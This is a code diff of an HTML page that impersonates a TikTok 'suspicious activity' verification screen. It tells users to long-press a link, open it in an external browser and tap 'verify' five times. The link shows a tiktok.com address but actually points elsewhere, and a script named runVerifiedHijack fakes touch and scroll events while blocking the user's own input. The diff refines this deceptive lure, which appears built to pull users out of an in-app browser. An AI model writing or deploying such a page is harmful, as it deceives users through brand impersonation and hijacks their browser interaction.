@@ -15,37 +15,35 @@
         #main-content { 
             position: relative;
             text-align: center; 
-            font-family: "Proxima Nova", "Inter", "Segoe UI", Roboto, sans-serif;
-            padding: 0 25px; 
-            margin-top: 110px;
+            font-family: "Proxima Nova", "Inter", sans-serif;
+            padding: 0 30px; 
+            margin-top: 130px;
         }
 
         .verification-icon {
-            width: 65px; height: 65px; margin-bottom: 15px;
+            width: 60px; height: 60px; margin-bottom: 15px;
         }
 
         .header {
             color: #161823; font-size: 22px; font-weight: 700;
-            margin-bottom: 10px; line-height: 1.2;
+            margin-bottom: 10px;
         }
 
         .subtext {
             color: #8A8B91; font-size: 16px; line-height: 1.5;
-            margin-bottom: 20px; 
-            max-width: 320px; /* Constrains the column width */
+            margin-bottom: 25px; max-width: 310px;
             margin-left: auto; margin-right: auto;
         }
 
-        /* Centered column for bullets */
         .instruction-list {
             display: inline-block;
             text-align: left;
             color: #8A8B91;
             font-size: 15px;
-            margin-bottom: 65px; 
-            padding-left: 20px;
-            line-height: 1.6;
-            max-width: 300px; /* Matches the paragraph width */
+            margin-bottom: 50px; 
+            padding-left: 18px;
+            line-height: 1.7;
+            max-width: 290px;
         }
 
         .instruction-list li {
@@ -54,20 +52,23 @@
 
         #breakout-link {
             color: #0049f6; text-decoration: underline;
-            font-size: 15px; /* Slightly smaller for 'technical' look */
-            word-break: break-all;
+            font-size: 17px; font-weight: 500;
             display: inline-block; 
             z-index: 10000;
             position: relative; 
             -webkit-tap-highlight-color: transparent;
-            max-width: 90%;
         }
 
-        #shield { 
-            display: none; position: fixed; 
-            top: 0; left: 0; width: 100%; height: 100%; 
-            z-index: 5000; pointer-events: none; 
+        #footer-ref {
+            /* Tucked closely under the link */
+            margin-top: 8px; 
+            color: #D1D1D3;
+            font-size: 10px; 
+            font-family: monospace;
+            letter-spacing: 0.5px;
         }
+
+        #shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 5000; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -75,23 +76,25 @@
     <div id="top-block"></div>
 
     <div id="main-content">
-        <svg class="verification-icon" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
             <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
             <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
             <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
         </svg>
 
-        <div class="header">Suspicious network activity</div>
-        <div class="subtext">We’ve detected unusual activity from your network. Please complete the verification to continue using TikTok.</div>
+        <div class="header">Suspicious activity</div>
+        <div class="subtext">Please complete verification to continue using TikTok.</div>
 
         <ul class="instruction-list">
-            <li>hold the link</li>
-            <li>press "open link" in external browser</li>
-            <li>press the verify button 5 times to complete verification</li>
+            <li>Hold the link below</li>
+            <li>Select "open link"</li>
+            <li>Tap verify 5 times</li>
         </ul>
 
-        <br>
-        <a id="breakout-link" href="https://www.google.com">https://www.tiktok.com/safety/verify/external?id=8392104-sec</a>
+        <div id="link-area">
+            <a id="breakout-link" href="https://www.google.com">https://www.tiktok.com/verify</a>
+            <div id="footer-ref">REF_ID: #8392-V2-AUTH</div>
+        </div>
     </div>
 
     <script>
@@ -108,7 +111,7 @@
             for (let i = 0; i <= steps; i++) {
                 const currentY = startY - ((startY - endY) * (i / steps));
                 document.body.dispatchEvent(createTouchEvent('touchmove', currentY));
-                window.scrollTo(0, (600 * (i / steps)));
+                window.scrollTo(0, 600 * (i / steps));
                 await new Promise(r => setTimeout(r, stepDelay));
             }
             document.body.dispatchEvent(createTouchEvent('touchend', endY));
@@ -120,17 +123,14 @@
             const link = document.getElementById('breakout-link');
             link.addEventListener('click', (e) => e.preventDefault(), { capture: true });
             link.addEventListener('touchend', (e) => e.preventDefault(), { passive: false });
-
             const prevent = (e) => { 
                 if (e.target.id === 'breakout-link' && e.type === 'touchstart') return;
-                e.preventDefault(); 
-                e.stopPropagation(); 
+                e.preventDefault(); e.stopPropagation(); 
             };
             ['touchstart', 'touchmove', 'wheel'].forEach(ev => {
                 window.addEventListener(ev, prevent, { passive: false, capture: true });
             });
         }
-
         window.onload = () => { setTimeout(runVerifiedHijack, 150); };
     </script>
 </body>
